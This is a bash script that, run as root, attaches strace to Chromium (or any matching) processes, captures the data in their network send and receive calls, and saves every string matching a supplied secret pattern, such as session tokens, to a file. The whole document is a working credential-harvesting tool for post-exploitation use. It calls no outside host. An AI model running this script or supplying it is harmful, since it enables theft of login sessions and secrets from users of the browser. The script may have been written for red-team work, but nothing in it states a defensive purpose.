#!/usr/bin/env bash

# This script will attach to chromium PIDs and search for strings matching the input secret_regex.

function strace_chrome() {
    echo "[+] - Looking for secret_regex '${secret_regex}' and outputing to ${tok_file}"
    echo "[+] - Press Ctrl-C to terminate execution."
    for pid in $(pgrep ${process_regex}); do
        if ${verbose}; then
            echo "[INFO] - Starting strace process for pid ${pid}."
            strace -s99999 -yyy -f -p ${pid} -e signal=\!all -e send,sendto,recv,recvfrom -o"|grep -Po '${secret_regex}' | tee -a '${tok_file}'" 2>/dev/null &
        else
            strace -s99999 -yyy -f -p ${pid} -e signal=\!all -e send,sendto,recv,recvfrom -o"|grep -Po '${secret_regex}' >> '${tok_file}'" 2>/dev/null &
        fi
    done
}

function cleanup() {
    echo -en '\r'
    echo "[+] - Starting cleanup..."
    echo "[+] - Unique token values:"
    cat ${tok_file} | sort -u
    echo "[+] - Killing strace processes."
    pkill strace
    exit 0
}

function check_root() {
    if [[ ! $EUID -eq 0 ]]; then
        echo "[ERROR] - script must be run as root"
        exit 1
    fi
}

function parse_args() {
    if [[ $# -eq 3 ]]; then
        verbose=false
    elif [[ $# -eq 4 ]]; then
        verbose=true
    else
        echo "usage: $0 secret_regex output process_regex [-v]"
        exit 2
    fi

    secret_regex="$1"
    tok_file="$2"
    process_regex="$3"
}

function main() {
    parse_args "$@"
    check_root
    strace_chrome
    sleep 500
}

set -uo pipefail
trap cleanup EXIT

main "$@"
